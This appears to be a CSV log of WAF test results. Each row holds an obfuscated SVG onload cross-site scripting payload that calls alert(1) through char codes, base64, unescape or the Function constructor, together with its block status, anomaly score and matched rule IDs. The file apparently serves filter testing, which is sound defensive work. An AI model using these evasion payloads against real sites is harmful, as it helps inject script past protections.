2837,"<svg onload='(function(){var a=window[[""a"",""l"",""e"",""r"",""t""].join("""")];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,28v217,80t:urlDecodeUni,t:compressWhitespace || ",25,177603616026.892855
2838,"<svg onload='(function(){var a=window[""al\u0065rt""];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,20v217,62t:urlDecodeUni,t:compressWhitespace || ",25,177603616150.351409
2839,"<svg onload='(function(){var a=window[`${""a""}${""l""}${""e""}${""r""}${""t""}`];a(1)})()'>",0,1,block,7,"932130,934100,941100,941120,941160,941370,949110","o38,28v217,82t:urlDecodeUni,t:cmdLine || o14,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,40v217,82t:urlDecodeUni,t:compressWhitespace || ",30,177603616260.348172
2840,"<svg onload='(function(){var a=window[""a\154\145\162\164""];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,27v217,69t:urlDecodeUni,t:compressWhitespace || ",25,177603616333.343751
2841,"<svg onload='(function(){var a=Function(""return this"")()[""al""+""ert""];a(1)})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o39,38v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || o14,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603616525.881946
2843,"<svg onload='(function(){var a=window[""\141\154\145\162\164""];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,30v217,72t:urlDecodeUni,t:compressWhitespace || ",25,177603616755.079971
2846,"<svg onload='(function(){var a=window[""a\x6cert""];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,60t:urlDecodeUni,t:compressWhitespace || ",25,177603617133.973658
2847,"<svg onload='(function(){var a=globalThis[""\u0061l\u0065rt""];a(1)})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603617245.498046
2848,"<svg onload='(function(){var a=unescape(""%61"");var l=unescape(""%6c"");var e=unescape(""%65"");var r=unescape(""%72"");var t=unescape(""%74"");eval(a+l+e+r+t+unescape(""%28%31%29""))})()'>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o134,5v217,178 || o135,41v217,178 || o14,11v217,178 || o14,11v217,178t:urlDecodeUni || v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603617391.329231
2849,"<svg onload='(function(){var s=atob(""YWxlcnQoMSk"");eval(s)})()'>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o50,5v217,64 || o51,11v217,64 || o14,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603617439.737721
2851,"<svg onload='(function(){var s=[97,108,101,114,116,40,49,41];var r="""";for(var i=0;i<s.length;i++)r+=String.fromCharCode(s[i]);eval(r)})()'>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o125,5v217,139 || o126,11v217,139 || o14,11v217,139 || o14,11v217,139t:urlDecodeUni || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603617782.513320
2852,"<svg onload='(function(){var f=Function;var a=String.fromCharCode(97,108,101,114,116,40,49,41);f(a)()})()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o96,9v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760361785.963484
2853,"<svg onload='(function(){var w=window;var a=w[String.fromCharCode(97,108,101,114,116)];a(1)})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603618056.950496
2854,"<svg onload='(function(){var c=constructor;var f=("""")[""constructor""][""constructor""];f(String.fromCharCode(97,108,101,114,116,40,49,41))()})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,143 || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603618178.399302
2855,"<svg onload='(function(){var _0x1=""\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"";eval(_0x1)})()'>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o84,5v217,101 || o85,14v217,101 || o14,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603618271.968346
2856,"<svg onload='(function(){var x=String;var y=x.fromCharCode;var z=y(97,108,101,114,116);self[z](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o91,10v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,7v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177603618490.593200
2857,"<svg onload='(function(){var obj={a:97,l:108,e:101,r:114,t:116};var s=String.fromCharCode(obj.a,obj.l,obj.e,obj.r,obj.t);eval(s+String.fromCharCode(40,49,41))})()'>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o120,5v217,164 || o121,41v217,164 || o14,11v217,164 || o14,11v217,164t:urlDecodeUni || v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603618577.625732
2859,"<svg onload='(function(){var code=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29);eval(code)})()'>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o94,5v217,111 || o95,14v217,111 || o14,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603618712.620827
2860,<svg onload='(function(){var b=String.fromCharCode;var c=b(97)+b(108)+b(101)+b(114)+b(116)+b(40)+b(49)+b(41);eval(c)})()'>,0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o108,5v217,122 || o109,11v217,122 || o14,11v217,122 || o14,11v217,122t:urlDecodeUni || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760361883.134445
2861,"<svg onload='(function(){with(document)with(location)with(String)eval(fromCharCode(97,108,101,114,116,40,49,41))})()'>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o65,51v217,118 || o14,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603619011.415141
2862,"<svg onload='(function(){var g=globalThis;var h=g[""a\x6cert""];h(1)})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603619176.169313
2863,"<svg onload='(function(){var k=[][""constructor""][""constructor""];k(""a\x6cert(1)"")()})()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o75,11v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603619232.030357
2864,"<svg onload='(function(){var m=Function(""return this"")();var n=m[""\u0061\u006c\u0065\u0072\u0074""];n(1)})()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o39,68v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603619317.401464
2865,"<svg onload='(function(){setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603619566.672221
2866,"<svg onload='(function(){var arr=[String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)];eval(arr.join("""")+String.fromCharCode(40,49,41))})()'>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o158,5v217,213 || o159,52v217,213 || o14,11v217,213 || o14,11v217,213t:urlDecodeUni || v217,213t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,213t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,213t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603619635.369012
2869,"<svg onload='(function(){var b=atob(""YWxlcnQ="");window[b](1)})()'/>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o54,10v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v217,67t:urlDecodeUni,t:compressWhitespace || ",30,177603620047.089958
2877,"<svg onload='(function(){var d=unescape(""%61%6c%65%72%74"");this[d](1)})()'/>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o53,10v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,76 || o14,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,7v217,76t:urlDecodeUni,t:compressWhitespace || ",35,177603620981.848777
2882,"<svg onload='Function(""ale""+""rt(1)"")()'/>",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,41 || v216,41t:urlDecodeUni || ",25,177603621672.617536
2883,"<svg onload='(function(){with(String)top[fromCharCode(97,108,101,114,116)](1)})()'/>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,37v217,84t:urlDecodeUni,t:compressWhitespace || ",25,177603621725.178062
2886,"<svg onload='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'/>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603622082.348370
2891,"<svg onload='(function(){return Function})()(""\u0061\u006c\u0065\u0072\u0074(1)"")()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,70v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603622627.142548
2898,"<svg/onload='(new/**/Function(""\u0061\u006c\u0065\u0072\u0074(1)""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603623598.276829
2901,"<svg onload='Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603623918.452952
2902,"<svg onload='Function(atob(""YWxlcnQoMSk=""))()'>",0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603624020.544777
2904,"<svg onload='(new Function(""\u{61}\u{6c}\u{65}\u{72}\u{74}(1)""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603624395.447419
2908,"<svg onload='(new Function(""al""+""ert\u00281\u0029""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,56 || o14,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603624881.530454
2910,"<svg onload='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603625086.827337
2912,<svg onload='(new Function(`al`+`ert(1)`))()'>,0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v216,46 || o14,13v216,46t:urlDecodeUni || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603625384.340139
2914,"<svg onload='(new(Function)(""al""+""ert\u00281\u0029""))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,42v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603625551.083775
2915,"<svg onload='(new/**/Function(""al""+""ert(1)""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603625714.993383
2920,"<svg onload='(new Function(atob(""YWxlcnQoMSk"")))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v216,52 || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603626368.466276
2921,"<svg onload='(new Function(""retur""+""n ale""+""rt""))()(1)'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,41v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,56 || o14,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603626538.944255
2922,"<svg onload='(new Function(""self[\""al\""+\""ert\""](1)""))()'>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,13v217,58 || o14,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,20v217,58t:urlDecodeUni,t:compressWhitespace || ",30,177603626621.160402
2923,"<svg onload='(new Function(""wind""+""ow.ale""+""rt(1)""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,56 || o14,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603626725.584381
2924,"<svg onload='(new Function(""ale""+""rt\50\61\51""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v216,52 || o14,13v216,52t:urlDecodeUni || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603626887.545919
2926,"<svg onload='(new Function(""ale""+""rt"".concat(""(1)"")))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,57 || o14,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603627192.004733
2927,"<svg onload='(new Function([""al"",""ert"",""(1)""].join("""")))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603627246.801290
